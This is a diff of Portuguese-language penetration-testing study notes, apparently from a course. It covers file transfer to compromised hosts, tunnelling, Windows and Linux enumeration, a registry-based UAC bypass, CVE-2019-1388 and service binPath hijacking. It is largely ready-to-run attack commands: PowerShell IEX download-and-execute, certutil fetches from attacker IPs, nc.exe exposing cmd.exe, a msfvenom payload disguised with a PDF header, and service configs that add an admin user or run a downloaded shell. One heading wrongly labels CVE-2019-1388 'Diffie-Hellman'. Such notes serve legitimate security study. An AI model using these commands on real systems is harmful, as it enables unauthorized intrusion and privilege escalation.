@@ -4350,23 +4350,23 @@ Diferença entre Shells -> interativa e não interativa
 
     python -c 'import pty; pty.spawn("/bin/bash")'
 
-        Para pegar uma shel mais interativa.
+Para pegar uma shel mais interativa.
 
 
-Transferência de arquivos: WEB
+- Transferência de arquivos: WEB
 
     service apache2 start
 
-        Subindo o servidor
+Subindo o servidor
 
     python -m SimpleHTTPServer 80
 
-        Subindo uma página local na porta informada usando python ou
+Subindo uma página local na porta informada usando python ou
 
         python3 -m http.server 80
 
 
-    Se conectando à ele (WINDOWS):
+Se conectando à ele (WINDOWS):
 
         1 - certutil.exe -urlcache -f http://172.20.1.6/file.exe file.exe Faz Download do arquivo
 
@@ -4377,105 +4377,111 @@ Transferência de arquivos: WEB
         4 - powershel.exe IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.1.6/file.exe','file.exe') Faz down e executa
 
 
-    Se conectando à ele (LINUX):
+Se conectando à ele (LINUX):
 
         wget http://172.20.1.6/file.exe -O /tmp/file.exe
 
         curl http://172.20.1.6/file.exe -o file.exe
 
 
-Transferência de arquivos: FTP
+- Transferência de arquivos: FTP
 
-    Subindo o servidor
+Subindo o servidor
 
         pip install pyftplib
 
-    Subindo o servidor com python
+Subindo o servidor com python
 
         sudo apt install python3-pyftpdlib
 
         python -m pyftpdlib -p 4455 --write
 
 
-    Se conectando à ele (WINDOWS):
+Se conectando à ele (WINDOWS):
 
         ftp ip-do-alvo door
-
         USER anonymous
-
         PASS anonymous
-
         get arquivo.ext
 
 
-    Criando arquivo de conexão (Quando a shell não é interativa)
+Criando arquivo de conexão (Quando a shell não é interativa)
 
-        nano ftp.txt
+	nano ftp.txt
+	
+.
 
-echo open 192.168.254.51  > ftp.txt
+	echo open 192.168.254.51  > ftp.txt
 
-echo USER anonymous >> ftp.txt
+	echo USER anonymous >> ftp.txt
 
-echo PASS anonymous >> ftp.txt
+	echo PASS anonymous >> ftp.txt
 
-echo bin >> tp.txt
+	echo bin >> tp.txt
 
-echo get arquivo.ext >> ftp.txt
+	echo get arquivo.ext >> ftp.txt
 
-echo quit >> ftp.txt
+	echo quit >> ftp.txt
+	
+.
 
-    ftp -v -n -s:ftp.txt 
+  	ftp -v -n -s:ftp.txt 
 
-        Usando o arquivo e baixando o arquivo do server
+Usando o arquivo e baixando o arquivo do server
 
 
-Transferência de arquivos: HEX
+- Transferência de arquivos: HEX
 
 Transferir um programa usando o caracteres em HEX para copiar no CMD do alvo e ter o programa lá
 
     upx -9 plink.exe 
 
-        Diminuir o tamanho do arquivo para gerar menos chars
+Diminuir o tamanho do arquivo para gerar menos chars
 
     ls -lh plink.exe 
 
-        Verifica o arquivo em kbytes para saber o tamanho
+Verifica o arquivo em kbytes para saber o tamanho
 
     exe2hex -x plink.exe -p link.txt Usar -D 
 
-        (em sistema WIN mais antigos) Gera arquivo txt para colar no cmd
+Gera arquivo txt para colar no cmd (em sistema WIN mais antigos) 
 
 
-Transferência de arquivos: File Type
+- Transferência de arquivos: File Type
 
-Mudar o header do arquivo para burlar a inserção do mesmo no alvo uma vez que o mesmo não tem outra possibilidade de rodar comando ou importar arquivos. Depois de já ter o RCE do alvo (arquivo que permita executar comandos no browser) gerar payload com msfvenom linx-86-meter-tcp -f elf para o sistema alvo. Criar arquivo com o %PDF-1.3 e juntar os dois com cat header shell > payload-psf e depois adicionar a extensão .pdf caso o sistema alvo barre a inserção mesmo assim. para usar, é necessário tirar o header devido ser PDF com o comando (no browser)...hack=tail -n +2 uploads/payload.pdf > payload e depois ./payload Lembrar: Olhar o diretório, payload do msfconsole, porta, IP
+Mudar o header do arquivo para burlar a inserção do mesmo no alvo uma vez que o mesmo não tem outra possibilidade de rodar comando ou importar arquivos. Depois de já ter o RCE do alvo (arquivo que permita executar comandos no browser) gerar payload com `msfvenom linx-86-meter-tcp -f elf` para o sistema alvo. Criar arquivo com o `%PDF-1.3` e juntar os dois com `cat header shell > payload-psf` e depois adicionar a extensão `.pdf` caso o sistema alvo barre a inserção mesmo assim. Para usar, é necessário tirar o header devido ser `PDF` com o comando (no browser)...`hack=tail -n +2 uploads/payload.pdf > payload e depois ./payload` Lembrar: Olhar o diretório, payload do msfconsole, porta, IP
 
-Tunelamento: Linux
+- Tunelamento: Linux
 
 Enviar o serviço ssh do alvo para o atacante, quando o alvo está configurado para receber apenas conexões locais. Pra isso, é necessário usar o socat ou outros programas. no
 
-    ALVO socat TCP4:ip-pentester:8443 TCP4:127.0.0.1:22 
+ ALVO 
+ 
+	socat TCP4:ip-pentester:8443 TCP4:127.0.0.1:22 
+	
+(deixar aberto o terminal rodando)
 
-        (deixar aberto o terminal rodando)
+ATACANTE
 
-    ATACANTE socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr 
+	socat TCP4-LISTEN:8443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr 
 
-        Receberá a conexão reversa na máquina local
+Receberá a conexão reversa na máquina local
 
 
-Nota: Para procurar pelo socat whereis socat ou dpkg -l | grep socat
+Nota: Para procurar pelo socat `whereis socat` ou `dpkg -l | grep socat`
 
-Escalando acesso SSH sem senha  (Not DONE)
+
+- Escalando acesso SSH sem senha  (Not DONE)
 
 Após feito o tunelamento usando o exemplo acima, deve-se criar as chaves pública e privada no atacante
 
-    Atacante 
+Atacante 
 
         ssh-keygen -f chave 
 
-        (chave p/ alvo e chave.pub p/ server) 
+(chave p/ alvo e chave.pub p/ server) 
 
-    Alvo (criar a estrutura do usuário)
+Alvo (criar a estrutura do usuário)
 
         mkdir ~www-data
 
@@ -4486,44 +4492,44 @@ Após feito o tunelamento usando o exemplo acima, deve-se criar as chaves públi
         echo "chave-publica(chave.pub)" > ~/.ssh/authorized_keys
 
 
-    Atacante
+Atacante
 
         ssh www-data@127.0.0.1 -p 2222 -i chave 
 
         ssh camila@172.16.1.31 -i id_rsa -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedAlgorithms=+ssh-rsa
 
-            Conecta com o servidor alvo usando a chave public&private
+Conecta com o servidor alvo usando a chave public&private
 
 
-Tunelamento: SSH  (Not DONE)
+- Tunelamento: SSH  (Not DONE)
 
 Usar o que foi feito acima e fechar uma conexão usando o próprio ssh
 
     ssh www-data@127.0.0.1 -p 2222 -i chave -L 3333:127.0.0.1:3306
 
-        Onde 3333 é a porta local que fechará o túnel com a porta 3306 (mysql) do alvo, dessa forma podendo diretamente da máquina atacante acessar o mysql da máquina alvo.
+Onde 3333 é a porta local que fechará o túnel com a porta 3306 (mysql) do alvo, dessa forma podendo diretamente da máquina atacante acessar o mysql da máquina alvo.
 
 
-Tunelamento Windows (Not DONE)
+- Tunelamento Windows (Not DONE)
 
-O mesmo que foi feito no LINUX fazendo no Windows com o plink.exe, Subir ssh no atacante e rodar o comando do plink para tunelar a porta local do alvo na porta do atacante através do ssh que foi aberto na máquina do atacante.
+O mesmo que foi feito no LINUX fazendo no Windows com o `plink.exe`, Subir ssh no atacante e rodar o comando do plink para tunelar a porta local do alvo na porta do atacante através do ssh que foi aberto na máquina do atacante.
 
 Simular porta aberta enviando cmd:
 
-    No alvo 
+No alvo 
 
         nc.exe -vnlp 5555 -s 127.0.0.1 -e cmd.exe
 
-    No atacante 
+No atacante 
 
         sudo service ssh start
 
-    No Alvo 
+No Alvo 
 
         plink.exe -ssh -l user -pw root -R ip-hacker:1337:127.0.0.1(ip-local-alvo):5555 ip-hacker
 
 
-Enumeração Host: Windows
+- Enumeração Host: Windows
 
 Comandos úteis para fazer o reconhecimento do ambiente
 
@@ -4565,57 +4571,52 @@ Comandos úteis para fazer o reconhecimento do ambiente
 
     findstr /s "pass=" *.txt 
 
-        Procura em arquivos txt a palavra pass=
+Procura em arquivos txt a palavra pass=
 
     type /caminho/do/arquivo.txt 
 
-        Ler um arquivo igual o cat
+Ler um arquivo igual o cat
 
 
-Enumeração automatizada: Windows
+- Enumeração automatizada: Windows
 
-    Ferramentas:
+Ferramentas:
 
-        WinPeas 
+	WinPeas.bat 
 
-        WesNG
-
-
-    WinPeas.bat 
-
-        Combina comandos com o a aula anterior e traz resultados interessantes do alvo
+Combina comandos com o a aula anterior e traz resultados interessantes do alvo
 
     WesNG 
 
-        Precisa dos dados sysinfo.txt para poder cruzar com a base atual e traz os possíveis exploit
+Precisa dos dados `sysinfo.txt` para poder cruzar com a base atual e traz os possíveis exploit
 
 
-Privilégios e Mecanismos de Integridade
+- Privilégios e Mecanismos de Integridade
 
 Usuário com nível de administrador não faz atividades administrativas devido o level mandatory ser Medium sempre é perguntado pela UAC para dor o ok na permissão  e executar a ação, diferente do usuário que tem a permissão do mandatory High.
 
-    Para saber o level:
+Para saber o level:
 
         net user usuário. 
 
-    Para  trocar de usuário no terminal 
+Para  trocar de usuário no terminal 
 
         runas /user:username cmd
 
 
-Estudo Técnico: Bypass UAC I e II
+- Estudo Técnico: Bypass UAC I e II
 
-    Passos: 
+Passos: 
 
         Encontrar programa que tenha o HIGH nos privilégios, executar ele escutando com o procmon, 
 
-        Procurar por registros notfound no diretório do usuário HKCU, 
+        Procurar por registros `notfound` no diretório do usuário `HKCU`, 
 
-        Alterar/criar um registro que não tenha ainda sido criado e pedir para ele executar o cmd.exe. 
+        Alterar/criar um registro que não tenha ainda sido criado e pedir para ele executar o `cmd.exe`. 
 
         Assim terá um cmd com acesso privilegiado.
 
-        Fazer download dos programas SysinternalsSuite para servir de análise dos programas e suas permissões. 
+        Fazer download dos programas `SysinternalsSuite` para servir de análise dos programas e suas permissões. 
 
         Principais: Procmon e sigcheck. 
 
@@ -4624,16 +4625,16 @@ Nota: Boa parte dos programas chamados pelo cmd está no system32
 
     internals: sigcheck.exe -a -m C:\Windows\System32\notepad.exe | computerdefaults.exe | fodhelper.exe 
 
-        Mostra os privilégios que o programa precisa para funcionar. a Ideia é procurar o mais alto nível para explorar. Se o autoelevate estiver true, não será necessário a senha do administrador
+Mostra os privilégios que o programa precisa para funcionar. a Ideia é procurar o mais alto nível para explorar. Se o autoelevate estiver `true`, não será necessário a senha do administrador
 
 
-Process Monitor Filtrar o nome do processo Computerdefaults.exe ou outro que tenha encontrado com privilégios. Depois executa o mesmo. Adicionar um filtro reg, filtrar o Path contains HKCU, Filtrar result contains name not found, Procurar registro shell open command que está setado como notfound. E adicionar o caminho reg add caminho/do/refistro/completo, Limpa a tela e executa o procmon de novo. Caso haja outra chamada em notfound adicionar ela reg add caminho/do/registro/completo /v DelegateExecute(nome endontrado) /t REG_SZ Já no filtro SUCCESS Verificar se já não há uma chamada sem valor e adicionar o cmd.exe com o comando reg add caminho/do/registro/completo /d "cmd.exe" /f Ou fazer via interface no registro. reiniciar o programa e o cmd.exe vai executar.
+Process Monitor Filtrar o nome do processo `Computerdefaults.exe` ou outro que tenha encontrado com privilégios. Depois executa o mesmo. Adicionar um filtro `reg`, filtrar o Path contains `HKCU`, Filtrar result contains name not found, Procurar registro shell open command que está setado como notfound. E adicionar o caminho `reg add caminho/do/refistro/completo`, Limpa a tela e executa o `procmon` de novo. Caso haja outra chamada em notfound adicionar ela `reg add caminho/do/registro/completo /v DelegateExecute(nome endontrado) /t REG_SZ` Já no filtro SUCCESS Verificar se já não há uma chamada sem valor e adicionar o `cmd.exe` com o comando `reg add caminho/do/registro/completo /d "cmd.exe" /f` Ou fazer via interface no registro. reiniciar o programa e o `cmd.exe` vai executar.
 
-Windows PrivEsc: Certificate Dialog
+- Windows PrivEsc: Certificate Dialog
 
-CVE-2019-1388 Vulnerabilidade que tem um executável, já inclusive no github/jas502n/cve-2019-1388 Que quando executado, é necessário ver o sertificado da aplicação que automaticamente abre o internet-explorer como user system, que permite acessar os arquivos na barra de menu, que pode-se abrir o /windows/system32/cmd.exe quando o cmd abre, já abre como usuário system, podendo fazer qualquer modificação naquele alvo.
+Diffie-Hellman `CVE-2019-1388` Vulnerabilidade que tem um executável, já inclusive no `github/jas502n/cve-2019-1388` Que quando executado, é necessário ver o sertificado da aplicação que automaticamente abre o `internet-explorer` como `user system`, que permite acessar os arquivos na barra de menu, que pode-se abrir o `/windows/system32/cmd.exe` quando o cmd abre, já abre como usuário system, podendo fazer qualquer modificação naquele alvo.
 
-Windows PrivEsc: Serviços I e II
+- Windows PrivEsc: Serviços I e II
 
 É uma falha onde você após estar com a shell, vai tentar identificar onde há serviços que são manipuláveis pelo seu usuário atual, alterando o path dele com um comando para injetar uma shell nele e ganhar acesso a nível de sistema...
 
@@ -4641,9 +4642,9 @@ Windows PrivEsc: Serviços I e II
 
     icacls "c:/caminho/do/programa/aqui.exe" 
 
-        Se houver o (F) significa FULL ACCESS
+Se houver o (F) significa FULL ACCESS
 
-        Alternativa
+Alternativa
 
         accesschk.exe -wvcu "Users" * 
 
@@ -4652,15 +4653,15 @@ No sysinternals pode usar o programa passado e obter informações diretamente, 
 
     sc query NomeDoServico 
 
-        Pegar informações do serviço
+Pegar informações do serviço
 
     sc qc NomeDoServico 
 
-        Pegar informações do serviço
+Pegar informações do serviço
 
     sc config NomeDoServiço binPath="net user hack adm@123 /add" 
 
-        Altera o Path para rodar o comando quando o programa for reiniciado
+Altera o Path para rodar o comando quando o programa for reiniciado
 
     sc stop NomeDoServico
 
@@ -4668,19 +4669,17 @@ No sysinternals pode usar o programa passado e obter informações diretamente, 
 
     sc config NomeDoServiço binPath="certutils -urlcache -f http://ip:porta/shell.exe shell.exe"
 
-        Criar uma shell com o msfvenom em exe
-
-        Reiniciar o programa/serviço
-
+Criar uma shell com o msfvenom em exe
+Reiniciar o programa/serviço
 
     sc config NomeDoServiço binPath="shell.exe"
 
-        Reiniciar o programa/serviço
+Reiniciar o programa/serviço
 
 
 Nota: Quando sem permissão de alterar o path do serviço nem reiniciar, pode-se tentar adicionar a shell no diretório deste serviço e substituir o nome da shell pelo nome do programa usando o comando MOVE e colocar para reiniciar o host, fazendo com que ao iniciar, o "programa" (shell) inicie junto.
 
-Enumeração Host: Linux
+- Enumeração Host: Linux
 
     id
 
@@ -4692,7 +4691,7 @@ Enumeração Host: Linux
 
     cat /etc/issue 
 
-        Versão exata do ubuntu/SO
+Versão exata do ubuntu/SO
 
     cat /etc/*-release 
 
